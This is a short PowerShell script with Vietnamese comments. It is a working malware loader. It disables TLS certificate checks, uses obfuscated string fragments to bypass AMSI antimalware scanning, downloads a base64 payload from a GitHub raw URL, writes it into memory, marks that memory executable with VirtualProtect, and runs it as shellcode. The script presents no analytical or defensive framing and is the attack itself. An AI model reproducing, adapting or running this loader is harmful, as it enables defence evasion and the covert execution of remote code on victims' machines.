# Bypass SSL và bật TLS 1.2
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Start-Sleep -Milliseconds 500
$tanhd2_1='A';$tanhd2_3='i';$tanhd2_2='ms';$tanhd2=$tanhd2_1+$tanhd2_2+$tanhd2_3;$cuongnh45_1='am';$cuongnh45_2='si';$cuongnh45_3='Ini';$cuongnh45_4='tFa';$cuongnh45_5='il';$cuongnh45_6='ed';$cuongnh45=$cuongnh45_1+$cuongnh45_2+$cuongnh45_3+$cuongnh45_4+$cuongnh45_5+$cuongnh45_6;$phuoctt2_1='No';$phuoctt2_2='nPu';$phuoctt2_3='bli';$phuoctt2_4='c,St';$phuoctt2_5='at';$phuoctt2_6='ic';$phuoctt2=$phuoctt2_1+$phuoctt2_2+$phuoctt2_3+$phuoctt2_4+$phuoctt2_5+$phuoctt2_6;$ex=$null;$bonus_withluv1=[Ref];$bonus_withluv2=$bonus_withluv1.Assembly;$bonus_withluv3=$bonus_withluv2.GetType("System.Management.Automation."+$tanhd2+"U"+"tils");$test=$bonus_withluv3.GetField($cuongnh45,$phuoctt2);$test.SetValue($ex,$true)

# Dùng WebClient thay vì Invoke-WebRequest
$wc = New-Object System.Net.WebClient
$base64_str = $wc.DownloadString("https://raw.githubusercontent.com/0xKaiser/test/0xKaiser-patch-1/loader.b64")

# Decode từ base64
$bytes = [Convert]::FromBase64String($base64_str)

# Cấp phát bộ nhớ
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)

# Đổi quyền bộ nhớ thành thực thi
$oldProtect = 0
$vp = Add-Type -MemberDefinition @"
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(System.IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect);
"@ -Name "Win32" -Namespace "PInvoke" -PassThru
$vp::VirtualProtect($ptr, $bytes.Length, 0x40, [ref]$oldProtect) | Out-Null

# Tạo delegate và gọi shellcode
$DelegateType = Add-Type -Name "Exec" -Namespace "Win32" -MemberDefinition @"
    [UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.StdCall)]
    public delegate void VoidFunc();
"@ -PassThru
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Win32.Exec+VoidFunc])
$func.Invoke()
